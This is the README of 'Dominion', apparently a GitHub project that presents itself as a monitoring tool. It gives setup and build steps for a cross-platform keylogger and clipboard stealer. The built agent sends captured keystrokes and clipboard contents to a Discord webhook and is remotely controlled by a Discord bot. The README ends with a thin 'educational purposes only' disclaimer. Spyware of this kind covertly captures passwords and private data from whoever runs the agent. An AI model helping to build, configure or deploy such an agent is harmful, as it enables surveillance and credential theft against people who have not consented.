# Dominion

![Dominion Banner](assets/dominion_banner.png)
[![Docs](https://img.shields.io/badge/Wiki-Docs-green?style=plastic&logo=wikipedia)](https://github.com/HackScaleTeam/Dominion/wiki)
[![Twitter URL](https://img.shields.io/twitter/follow/HackScale?style=plastic&logo=twitter)](https://twitter.com/_hackscale_)
[![Twitter URL](https://img.shields.io/twitter/follow/Samx86?style=plastic&logo=twitter)](https://twitter.com/sam_X86_)
[![YouTube URL](https://img.shields.io/youtube/channel/views/UCGY_Cnhao2lebIIYYb2jovA?style=plastic&logo=youtube)](https://www.youtube.com/channel/UCGY_Cnhao2lebIIYYb2jovA)
[![Donate with PayPal](https://img.shields.io/badge/PayPal-Donate-blue?style=plastic&logo=paypal)](https://paypal.me/HafizMohammed766)
[![Donate Bitcoin](https://img.shields.io/badge/Bitcoin-BTC-orange?style=plastic&logo=bitcoin)](https://s.binance.com/SQ9HmxEB) 

Dominion is a monitoring tool with keylogging and clipboard monitoring capabilities, controlled via a Discord bot interface. It is designed to be built for both Linux and Windows systems.

## Features

- **Keylogging**: Captures keystrokes and sends them to a Discord webhook.
- **Clipboard Monitoring**: Monitors the clipboard for changes and sends the content to a Discord webhook.
- **Discord Bot Interface**: The agent is controlled through a Discord bot, allowing for remote management.
- **Cross-Platform**: Can be built to run on both Linux and Windows.
- **Interactive Builder**: A command-line interface is provided to easily configure and build the agent.

## Requirements

- Python 3
- `pip`
- `git`

### For Linux:
- `xclip`
- `wine` (for building the Windows executable)

## Installation and Setup

1. **Clone the repository:**
   ```bash
   git clone https://github.com/HackScaleTeam/Dominion.git
   cd Dominion
   ```

2. **Run the installer:**
   The installer will check for dependencies and install them if they are missing.
   ```bash
   sudo bash install.sh
   ```

3. **Set up a Discord Bot:**
   - Go to the [Discord Developer Portal](https://discord.com/developers/applications) and create a new application.
   - In your application, go to the "Bot" tab and click "Add Bot".
   - Enable the "Message Content Intent" under "Privileged Gateway Intents".
   - Copy the bot token.
   - In the "OAuth2" tab, go to "URL Generator". Select the `bot` scope, and then grant the "Send Messages" and "Read Message History" permissions.
   - Copy the generated URL and paste it into your browser to invite the bot to your server.

4. **Set up a Discord Webhook:**
   - In your Discord server, go to "Server Settings" -> "Integrations" -> "Webhooks".
   - Create a new webhook and copy the webhook URL.

## Usage (Building the Agent)

The agent is built using an interactive command-line interface.

1. **Run the builder:**
   ```bash
   python3 setup.py
   ```

2. **Configure the agent:**
   Use the `set` command to configure the agent.
   ```
   Dominion > set guild-id <your-guild-id>
   Dominion > set bot-token <your-bot-token>
   Dominion > set channel-id <your-channel-id>
   Dominion > set webhook <your-webhook-url>
   ```
   - `guild-id`: The ID of the Discord server the bot is in.
   - `bot-token`: The bot token you copied from the Discord Developer Portal.
   - `channel-id`: The ID of the channel the bot will listen for commands in.
   - `webhook`: The webhook URL you copied from your Discord server.

3. **Build the agent:**
   Use the `build` command to build the agent for either Linux or Windows.
   ```
   Dominion > build linux
   ```
   or
   ```
   Dominion > build windows
   ```
   The executable will be located in the `dist` directory.

## Commands

The following commands can be sent in the specified Discord channel to control the agent:

- `!exit`: Shuts down the agent.

## Disclaimer

This tool is for educational purposes only. The author is not responsible for any misuse of this tool.
